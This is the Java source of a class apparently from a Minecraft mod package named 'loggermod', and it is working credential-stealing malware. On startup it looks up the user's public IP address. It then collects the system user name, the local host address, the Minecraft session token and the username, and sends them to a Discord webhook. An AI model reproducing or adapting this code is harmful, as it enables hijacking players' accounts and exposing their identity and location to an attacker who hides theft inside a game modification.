package com.jodexindustries.loggermod;

import net.minecraft.client.Minecraft;

import java.awt.*;
import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.InetAddress;
import java.net.URL;

public class Connection {
    private static String ip;

    public static void startup() {
        ip = null;

        DiscordWebhook webhook = Config.connection;

        try {
            URL url = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = in.readLine();
        } catch (IOException e) {
            e.printStackTrace();
        }

        try {
            webhook.addEmbed(new DiscordWebhook.EmbedObject()
                    .setTitle("Infinity")
                    .setDescription("Minecraft Modification | Connections")
                    .setColor(new Color(0xA800E8))
                    .addField("IP", ip, true)
                    .addField("USER", System.getProperty("user.name"), true)
                    .addField("LOCAL", String.valueOf(InetAddress.getLocalHost()), true)
                    .addField("TOKEN", Minecraft.getInstance().getSession().getToken(), true)
                    .addField("MC-NAME", Minecraft.getInstance().getSession().getUsername(), true)
                    .addField("Author", "_Jodex__", true)


                    .setThumbnail("https://cdn.discordapp.com/avatars/597799398507806723/0ab545727be133bb12f4865ea412b4b4.png?size=512"));

            webhook.execute();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }
}